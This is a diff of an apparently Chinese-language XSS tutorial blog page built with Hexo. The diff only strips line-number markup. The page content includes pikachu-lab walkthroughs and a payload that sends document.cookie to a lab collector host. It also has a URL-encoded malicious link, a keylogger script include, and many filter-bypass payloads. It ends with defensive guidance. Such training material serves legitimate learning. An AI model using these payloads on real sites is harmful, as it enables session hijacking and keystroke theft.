@@ -29,8 +29,7 @@
 
     <script src="/libs/jquery/jquery.min.js"></script>
 
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
-<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
 
 
 
@@ -544,10 +543,10 @@
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/20201102165714.png" alt="反射型XSS攻击流程"></center>
 
 <p><strong>程序源码示例</strong>：</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token keyword">echo</span> <span class="token string">"Welcome $name&lt;br>"</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token delimiter">?></span></code></pre>
 <p><strong>操作实例</strong>：<font color="red">最基本的XSS漏洞，数据流向：前端 → 后端 → 前端</font></p>
 <ol>
 <li><p>打开pikachu中的反射型<code>XSS(get)</code>，修改文本框的<code>maxlength</code>属性并在文本框中输入：<code>&#39;&quot;&gt;&lt;sCrIpT&gt;alert(63252)&lt;/sCrIpT&gt;</code>。</p>
@@ -697,10 +696,10 @@
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/XSS后台Cookie结果展示界面.png" alt="XSS后台Cookie结果展示界面"></center>
 </li>
 <li><p><strong>payload</strong></p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>document<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">'http://192.168.19.136:8080/pkxss/xcookie/cookie.php?cookie='</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>document<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">'http://192.168.19.136:8080/pkxss/xcookie/cookie.php?cookie='</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
 </li>
 <li><p>构造的恶意链接：（恶意信息需要URL格式转码一下以便隐藏）</p>
-<pre class="line-numbers language-shell"><code class="language-shell">http://192.168.19.136:8080/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location+%3D+%27http%3A%2F%2F192.168.19.136%3A8080%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27+%2B+document.cookie%3B%3C%2Fscript%3E&submit=submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class=" language-shell"><code class="language-shell">http://192.168.19.136:8080/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location+%3D+%27http%3A%2F%2F192.168.19.136%3A8080%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27+%2B+document.cookie%3B%3C%2Fscript%3E&submit=submit</code></pre>
 </li>
 <li><p>用户访问链接后网页显示的结果。</p>
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/百度一下.png" alt="百度一下"></center>
@@ -833,27 +832,27 @@
 <li><strong>同源策略</strong>：为了安全考虑，所有浏览器都约定了“同源策略”，同源策略禁止页面加载或执行与自身来源不同的域的任何脚本既不同域之间不能使用JS进行操作。比如：<code>x.com</code>域名下的js不能操作y.com域名下的对象。那么为什么要有同源策略？ 比如一个恶意网站的页面通过js嵌入了银行的登录页面（二者不同源），如果没有同源限制，恶意网页上的javascript脚本就可以在用户登录银行的时候获取用户名和密码。</li>
 </ul>
 <p><strong>Tips</strong>:下面这些标签跨域加载资源(资源类型是有限止的)是不受同源策略限制的</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"..."</span><span class="token operator">></span>  <span class="token comment" spellcheck="true">//加载本地js执行</span>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"..."</span><span class="token operator">></span>  <span class="token comment" spellcheck="true">//加载本地js执行</span>
 <span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"..."</span><span class="token operator">></span>  <span class="token comment" spellcheck="true">//图片</span>
 <span class="token operator">&lt;</span>link href<span class="token operator">=</span><span class="token string">"..."</span><span class="token operator">></span>  <span class="token comment" spellcheck="true">//css</span>
-<span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">"..."</span><span class="token operator">></span>  <span class="token comment" spellcheck="true">//任意资源</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">"..."</span><span class="token operator">></span>  <span class="token comment" spellcheck="true">//任意资源</span></code></pre>
 <ul>
 <li><p><strong>同源策略修改</strong>:<br><code>D:\phpStudy\WWW\pikachu\pkxss\rkeypress\rkserver.php</code><br>   同之前的案例到后台设置好<code>Access-Control-Allow-Origin</code>，设置为<code>*</code>，既允许所有人访问。</p>
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/键盘记录设置跨域访问.png" alt="键盘记录设置跨域访问"></center>
 </li>
 <li><p><strong>rk.js关键代码解读</strong>:</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> realkey <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>keyCode<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//获取用户键盘记录，最后转化为字符串</span>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> realkey <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>keyCode<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//获取用户键盘记录，最后转化为字符串</span>
 xl<span class="token operator">+</span><span class="token operator">=</span>realkey<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//赋值给x1</span>
-<span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//调用show涵数，通过下面ajax进行post发送键盘记录人内容</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//调用show涵数，通过下面ajax进行post发送键盘记录人内容</span></code></pre>
 </li>
 <li><p><strong>payload</strong>:</p>
-<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://192.168.19.136:8080/pkxss/rkeypress/rk.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://192.168.19.136:8080/pkxss/rkeypress/rk.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre>
 </li>
 </ul>
 <h2 id="XSS盲打"><a href="#XSS盲打" class="headerlink" title="XSS盲打"></a>XSS盲打</h2><p>​        XSS盲打就是攻击者在前端提交的数据不知道后台是否存在xss漏洞的情况下，提交恶意JS代码在类似留言板等输入框后，所展现的后台位置的情况下，网站采用了攻击者插入的恶意代码，当后台管理员在操作时就会触发插入的恶意代码，从而达到攻击者的目的。</p>
 <ol>
 <li><p><strong>payload</strong>：</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript">'"<span class="token operator">></span><span class="token operator">&lt;</span>sCrIpT<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">63252</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>sCrIpT<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class=" language-javascript"><code class="language-javascript">'"<span class="token operator">></span><span class="token operator">&lt;</span>sCrIpT<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">63252</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>sCrIpT<span class="token operator">></span></code></pre>
 </li>
 <li><p>在留言中输入payload。</p>
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/XSS盲打提交payload.png" alt="XSS盲打提交payload"></center>
@@ -872,32 +871,32 @@ xl<span class="token operator">+</span><span class="token operator">=</span>real
 <li><p>利用<code>&lt;&gt;</code>标记注射HTML、JavaScript</p>
 <p>通过<code>&lt;script&gt;</code>标签就能任意插入由JavaScript或VBScript编写的恶意脚本代码</p>
 <p>常用案例：</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
 </li>
 <li><p>利用HTML标签属性值执行XSS</p>
 <p>通过<code>javascript:[code]</code>伪协议形式编写恶意脚本</p>
 <p>常用案例：</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>table background<span class="token operator">=</span><span class="token string">"javascript:alert(/xss/)"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>table<span class="token operator">></span>
-<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"javascript:alert('xss')"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>table background<span class="token operator">=</span><span class="token string">"javascript:alert(/xss/)"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>table<span class="token operator">></span>
+<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"javascript:alert('xss')"</span><span class="token operator">></span></code></pre>
 </li>
 <li><p>空格、回车、<code>Tab</code>绕过过滤</p>
 <p>由于在编译时JavaScript语句通常以分号结尾，如果JavaScript引擎确定一个语句是完整的，而这一行的结尾有换行符，那么就可以省略分号；否则JavaScript会继续处理发现的内容，直到遇到一个分号或发现语句完整为止。</p>
 <p>常用案例：</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// Tab键</span>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// Tab键</span>
 <span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"java    script:alert('xss')"</span><span class="token operator">></span>            
 <span class="token comment" spellcheck="true">// 回车</span>
 <span class="token operator">&lt;</span>img src<span class="token operator">=</span>"javas
 cript<span class="token punctuation">:</span>
-<span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span>"<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span>"<span class="token operator">></span></code></pre>
 </li>
 <li><p>对标签属性值进行转码</p>
 <p>常用案例：</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"javascript:slert('xss');"</span><span class="token operator">></span>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"javascript:slert('xss');"</span><span class="token operator">></span>
 替换成：
 <span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"javascrip&amp;#116&amp;#58slert('xss');"</span><span class="token operator">></span>
 其中，t的ASCII码值为<span class="token number">116</span>，<span class="token punctuation">:</span>的ASCII码值为<span class="token number">58</span>
 再进一步替换：
-<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"javascrip&amp;#0000116&amp;#0000058slert('xss');"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"javascrip&amp;#0000116&amp;#0000058slert('xss');"</span><span class="token operator">></span></code></pre>
 </li>
 <li><p>产生事件如<code>click</code>、<code>mouseover</code>、<code>load</code>等</p>
 <p>W3C将事件分为3种不同的类型：</p>
@@ -907,12 +906,12 @@ cript<span class="token punctuation">:</span>
 <li>变化（对文档进行修改）</li>
 </ul>
 <p>常用案例：</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"button"</span> value<span class="token operator">=</span><span class="token string">"Click Me"</span> onclick<span class="token operator">=</span><span class="token string">"alert('xss')"</span><span class="token operator">/</span><span class="token operator">></span>
-<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"#"</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"button"</span> value<span class="token operator">=</span><span class="token string">"Click Me"</span> onclick<span class="token operator">=</span><span class="token string">"alert('xss')"</span><span class="token operator">/</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"#"</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span></code></pre>
 </li>
 <li><p>利用CSS跨站过滤</p>
 <p>常见案例：</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token string">"background-image:url(javascript:alert('xss'))"</span><span class="token operator">></span>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token string">"background-image:url(javascript:alert('xss'))"</span><span class="token operator">></span>
 <span class="token operator">&lt;</span>style<span class="token operator">></span>
 body <span class="token punctuation">{</span>background<span class="token operator">-</span>image<span class="token punctuation">:</span><span class="token function">url</span><span class="token punctuation">(</span><span class="token string">"javascript:alert(/xss/)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
 <span class="token operator">&lt;</span><span class="token operator">/</span>style<span class="token operator">></span>
@@ -926,11 +925,11 @@ body <span class="token punctuation">{</span>background<span class="token operat
 <span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">" javascript:alert('xss')"</span><span class="token operator">></span>
 <span class="token operator">&lt;</span>style<span class="token operator">></span>
     @<span class="token keyword">import</span> <span class="token string">'javascript:alert(/xss/)'</span><span class="token punctuation">;</span>
-<span class="token operator">&lt;</span><span class="token operator">/</span>style<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token operator">&lt;</span><span class="token operator">/</span>style<span class="token operator">></span></code></pre>
 </li>
 <li><p>扰乱XSS过滤规则</p>
 <p>常见案例：</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript">一个正常的XSS输入<span class="token punctuation">:</span>
+<pre class=" language-javascript"><code class="language-javascript">一个正常的XSS输入<span class="token punctuation">:</span>
 <span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"javascript:alert(0);"</span><span class="token operator">></span>
 转换大小写后的XSS<span class="token punctuation">:</span>
 <span class="token operator">&lt;</span>IMG SRC<span class="token operator">=</span><span class="token string">"javascript:alert(0);"</span><span class="token operator">></span>
@@ -959,11 +958,11 @@ CSS关键字转码
 <span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token string">"xss:\0065xpression(alert('XSS'));"</span><span class="token operator">></span>
 <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"-->&lt;img src=x onerror=alert(1)//"</span><span class="token operator">></span>
 <span class="token operator">&lt;</span>comment<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"&lt;/comment>&lt;img src=x onerror=alert(1)//"</span><span class="token operator">></span>
-<span class="token operator">&lt;</span>style<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>“<span class="token operator">&lt;</span><span class="token operator">/</span>style<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//”></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token operator">&lt;</span>style<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>“<span class="token operator">&lt;</span><span class="token operator">/</span>style<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//”></span></code></pre>
 </li>
 <li><p>利用字符编码</p>
 <p>常用案例：</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript">原始语句<span class="token punctuation">:</span>
+<pre class=" language-javascript"><code class="language-javascript">原始语句<span class="token punctuation">:</span>
 <span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"javascript:alert('xss');"</span><span class="token operator">></span>
 十进制编码
 <span class="token operator">&lt;</span>img
@@ -981,15 +980,15 @@ src<span class="token operator">=</span>"<span class="token operator">&amp;</spa
 十六进制编码
 <span class="token operator">&lt;</span>img
 src<span class="token operator">=</span>"<span class="token operator">&amp;</span>#x6a<span class="token operator">&amp;</span>#x61<span class="token operator">&amp;</span>#x76<span class="token operator">&amp;</span>#x61<span class="token operator">&amp;</span>#x73<span class="token operator">&amp;</span>#x63<span class="token operator">&amp;</span>#x72<span class="token operator">&amp;</span>#x69<span class="token operator">&amp;</span>#x70<span class="token operator">&amp;</span>#x74<span class="token operator">&amp;</span>#x3a<span class="token operator">&amp;</span>#
-x61<span class="token operator">&amp;</span>#x6c<span class="token operator">&amp;</span>#x65<span class="token operator">&amp;</span>#x72<span class="token operator">&amp;</span>#x74<span class="token operator">&amp;</span>#x28<span class="token operator">&amp;</span>#x27<span class="token operator">&amp;</span>#x78<span class="token operator">&amp;</span>#x73<span class="token operator">&amp;</span>#x73<span class="token operator">&amp;</span>#x27<span class="token operator">&amp;</span>#x29<span class="token operator">&amp;</span>#x3b"<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+x61<span class="token operator">&amp;</span>#x6c<span class="token operator">&amp;</span>#x65<span class="token operator">&amp;</span>#x72<span class="token operator">&amp;</span>#x74<span class="token operator">&amp;</span>#x28<span class="token operator">&amp;</span>#x27<span class="token operator">&amp;</span>#x78<span class="token operator">&amp;</span>#x73<span class="token operator">&amp;</span>#x73<span class="token operator">&amp;</span>#x27<span class="token operator">&amp;</span>#x29<span class="token operator">&amp;</span>#x3b"<span class="token operator">></span></code></pre>
 </li>
 <li><p>利用字符编码<code>eval()</code>函数、<code>eval()</code>函数和<code>string.fromCharCode()</code>函数过滤</p>
 <p>常用案例：</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
 <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
 <span class="token operator">&lt;</span>img
-src<span class="token operator">=</span>"javascript<span class="token punctuation">:</span><span class="token function">eval</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">120</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+src<span class="token operator">=</span>"javascript<span class="token punctuation">:</span><span class="token function">eval</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">120</span></code></pre>
 </li>
 </ol>
 <h1 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h1><p>​        大多数网站为了避免xss的攻击，对于攻击者的输入都采取了过滤的措施，导致攻击者通常不能正常插入恶意代码来达到攻击目的。但是仍存在一些漏洞可以利用，来绕过过滤措施。</p>
@@ -1012,7 +1011,7 @@ src<span class="token operator">=</span>"javascript<span class="token punctuatio
 <p><strong>可用的quotestyle类型</strong>：<br>ENT_COMPAT - 默认。仅编码双引号<br>ENT_QUOTES - 编码双引号和单引号<br>ENT_NOQUOTES - 不编码任何引号</p>
 <p>可使用以下语句绕过：  q’ onclick=’alert(111)’</p>
 <h2 id="xss之href输出绕过"><a href="#xss之href输出绕过" class="headerlink" title="xss之href输出绕过"></a>xss之href输出绕过</h2><p>​        javascript:alert(1111) 直接代入a标签herf里面一样可以绕过htmlspecialchars</p>
-<h2 id="xss之js输出绕过"><a href="#xss之js输出绕过" class="headerlink" title="xss之js输出绕过"></a>xss之js输出绕过</h2><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
+<h2 id="xss之js输出绕过"><a href="#xss之js输出绕过" class="headerlink" title="xss之js输出绕过"></a>xss之js输出绕过</h2><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
     $ms<span class="token operator">=</span><span class="token string">'11'</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1111</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span> <span class="token punctuation">;</span>
 <span class="token keyword">if</span><span class="token punctuation">(</span>$ms<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
     <span class="token keyword">if</span><span class="token punctuation">(</span>$ms <span class="token operator">==</span> <span class="token string">'tmac'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
@@ -1022,7 +1021,7 @@ src<span class="token operator">=</span>"javascript<span class="token punctuatio
             <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#fromjs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">'无论如何不要放弃心中所爱..'</span><span class="token punctuation">)</span>
         <span class="token punctuation">}</span>
 <span class="token punctuation">}</span>
-<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
 <h1 id="XSS常规防范"><a href="#XSS常规防范" class="headerlink" title="XSS常规防范"></a>XSS常规防范</h1><p>​        由于XSS通常可以插入在script标签、HTML注释、标签属性名、标签属性值、标签名字、CSS等中，所以接下来我们简单讲讲如何防御XSS攻击。  </p>
 <h2 id="输入过滤"><a href="#输入过滤" class="headerlink" title="输入过滤"></a>输入过滤</h2><p>​        输入验证就是对用户提交的信息进行有效验证，仅接受<strong>指定长度范围内</strong>的，采用<strong>适当的内容</strong>提交，阻止或者忽略除此外的其他任何数据。  </p>
 <p>输入验证要根据实际情况设计，下面是一些常见的检测和过滤：</p>
@@ -1035,7 +1034,7 @@ src<span class="token operator">=</span>"javascript<span class="token punctuatio
 <h2 id="输出编码"><a href="#输出编码" class="headerlink" title="输出编码"></a>输出编码</h2><p>​        大多数的Web应用程序都存在一个通病，就是会把用户输入的信息完完整整的输出在页面中，这样很容易便会产生一个XSS。HTML编码在防止XSS攻击上起到很大的作用，它主要是用对应的HTML实体编号替代字面量字符，这样做可以确保浏览器安全处理可能存在恶意字符，将其当做HTMl文档的内容而非结构加以处理。</p>
 <h2 id="黑白名单"><a href="#黑白名单" class="headerlink" title="黑白名单"></a>黑白名单</h2><p>有时根本就不需要考虑到它是不是HTML标签，我们根本用不到HTML标签。不管是采用输入过滤还是输出过滤，都是针对数据信息进行黑/白名单式的过滤。  </p>
 <p>不同的javascript写法包括：  </p>
-<pre class="line-numbers language-javascript"><code class="language-javascript">大小写混淆<span class="token punctuation">:</span>
+<pre class=" language-javascript"><code class="language-javascript">大小写混淆<span class="token punctuation">:</span>
 <span class="token operator">&lt;</span>img src<span class="token operator">=</span>JaVaScRiPt<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span class="token operator">></span>
 插入<span class="token punctuation">[</span>tab<span class="token punctuation">]</span>键；
 <span class="token operator">&lt;</span>img src<span class="token operator">=</span>”jav <span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span class="token punctuation">;</span>”<span class="token operator">></span>
@@ -1057,13 +1056,13 @@ asrci
 <span class="token operator">&lt;</span>img src<span class="token operator">=</span>” <span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span class="token punctuation">;</span>”<span class="token operator">></span>
 ascript<span class="token punctuation">:</span>
 pt<span class="token punctuation">:</span>
-javascript<span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+javascript<span class="token punctuation">:</span></code></pre>
 <p><strong>黑名单</strong>：<br>        过滤可能造成危害的符号及标签，发现使用者输入参数的值为<code>&lt; script&gt;xxx&lt; /script&gt;</code>就将其取代为空白。其优点是可以允许开发某些特殊HTML标签，确实是可能因过滤不干净而使攻击者绕过规则。<br><strong>白名单</strong>：<br>        白名单仅允许执行特定格式的语法，仅允许<code>&lt; img scr=“http://xxx” &gt;</code> 格式，其余格式一律取代为空白。其优点是可允许特定输入格式的HTML标签，确实是验证程序编写难度校高，且用户可输入变化减少。</p>
